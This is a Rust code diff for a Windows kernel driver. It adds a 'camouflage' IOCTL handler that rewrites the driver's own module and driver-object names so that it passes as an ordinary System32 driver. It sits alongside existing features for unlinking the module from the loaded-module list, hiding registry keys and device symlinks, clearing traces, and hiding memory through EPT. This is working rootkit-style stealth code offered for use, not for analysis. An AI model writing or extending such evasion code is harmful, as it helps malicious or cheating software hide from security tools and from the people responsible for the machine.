@@ -3,7 +3,10 @@
 use core::sync::atomic::{AtomicUsize, Ordering};
 
 use shared_contract::{
-    HideRequest, HideResponse, HIDE_FLAG_CLEAR_TRACES, HIDE_FLAG_DEVICE_SYMLINK,
+    CamouflageRequest, CamouflageResponse, HideRequest, HideResponse, CAMOUFLAGE_FLAG_ALL,
+    CAMOUFLAGE_FLAG_BASE_DLL_NAME, CAMOUFLAGE_FLAG_DRIVER_OBJECT_NAME,
+    CAMOUFLAGE_FLAG_FULL_DLL_NAME, CAMOUFLAGE_BASE_NAME_MAX, CAMOUFLAGE_DRIVER_NAME_MAX,
+    CAMOUFLAGE_FULL_PATH_MAX, HIDE_FLAG_CLEAR_TRACES, HIDE_FLAG_DEVICE_SYMLINK,
     HIDE_FLAG_EPT_MEMORY, HIDE_FLAG_PS_LOADED_MODULE, HIDE_FLAG_REGISTRY,
     HIDE_SERVICE_NAME_MAX, CLEAR_TRACE_DRIVER_NAME_MAX,
 };
@@ -129,6 +132,100 @@ pub(crate) fn apply(request: &HideRequest) -> HideResponse {
     );
 
     response
+}
+
+/// Applies post-load module name camouflage selected by `request.flags`.
+pub(crate) fn apply_camouflage(request: &CamouflageRequest) -> CamouflageResponse {
+    let base_name = c_str_to_str(&request.base_name, CAMOUFLAGE_BASE_NAME_MAX);
+    let full_path = c_str_to_str(&request.full_path, CAMOUFLAGE_FULL_PATH_MAX);
+    let driver_name = c_str_to_str(&request.driver_name, CAMOUFLAGE_DRIVER_NAME_MAX);
+
+    crate::eprintln!("stealth: ========== IOCTL_CAMOUFLAGE begin ==========");
+    crate::eprintln!(
+        "stealth: flags={:#x} (base={} full={} driver_obj={})",
+        request.flags,
+        flag_on(request.flags, CAMOUFLAGE_FLAG_BASE_DLL_NAME),
+        flag_on(request.flags, CAMOUFLAGE_FLAG_FULL_DLL_NAME),
+        flag_on(request.flags, CAMOUFLAGE_FLAG_DRIVER_OBJECT_NAME),
+    );
+
+    let mut response = CamouflageResponse::default();
+    let Some(base_name) = base_name else {
+        crate::eprintln!("stealth: camouflage invalid base_name");
+        return response;
+    };
+
+    let flags = if request.flags == 0 {
+        CAMOUFLAGE_FLAG_ALL
+    } else {
+        request.flags
+    };
+
+    let full_path_owned;
+    let full_path = match full_path {
+        Some(path) if !path.is_empty() => path,
+        _ => {
+            full_path_owned = default_full_path(base_name);
+            &full_path_owned
+        }
+    };
+
+    let driver_name_owned;
+    let driver_name = match driver_name {
+        Some(name) if !name.is_empty() => name,
+        _ => {
+            driver_name_owned = default_driver_name(base_name);
+            &driver_name_owned
+        }
+    };
+
+    crate::eprintln!(
+        "stealth: base={base_name} full={full_path} driver_obj={driver_name}"
+    );
+
+    let driver = DRIVER_PTR.load(Ordering::Acquire) as *mut DRIVER_OBJECT;
+    let result = kernel_stealth::camouflage_driver_module(
+        driver,
+        base_name,
+        full_path,
+        driver_name,
+        flag_on(flags, CAMOUFLAGE_FLAG_BASE_DLL_NAME),
+        flag_on(flags, CAMOUFLAGE_FLAG_FULL_DLL_NAME),
+        flag_on(flags, CAMOUFLAGE_FLAG_DRIVER_OBJECT_NAME),
+    );
+
+    response.base_dll_name = u8::from(result.base_dll_name);
+    response.full_dll_name = u8::from(result.full_dll_name);
+    response.driver_object_name = u8::from(result.driver_object_name);
+    response.success = u8::from(
+        result.base_dll_name || result.full_dll_name || result.driver_object_name,
+    );
+
+    if result.module_not_linked {
+        crate::eprintln!("stealth: camouflage failed module not linked (run before hide?)");
+    }
+
+    crate::eprintln!(
+        "stealth: ========== IOCTL_CAMOUFLAGE end success={} base={} full={} obj={} ==========",
+        response.success,
+        response.base_dll_name,
+        response.full_dll_name,
+        response.driver_object_name,
+    );
+
+    response
+}
+
+fn default_full_path(base_name: &str) -> alloc::string::String {
+    alloc::format!(r"\SystemRoot\System32\drivers\{base_name}")
+}
+
+fn default_driver_name(base_name: &str) -> alloc::string::String {
+    let stem = base_name
+        .strip_suffix(".sys")
+        .or_else(|| base_name.strip_suffix(".SYS"))
+        .unwrap_or(base_name);
+    alloc::string::String::from(stem)
 }
 
 fn flag_on(flags: u32, bit: u32) -> bool {
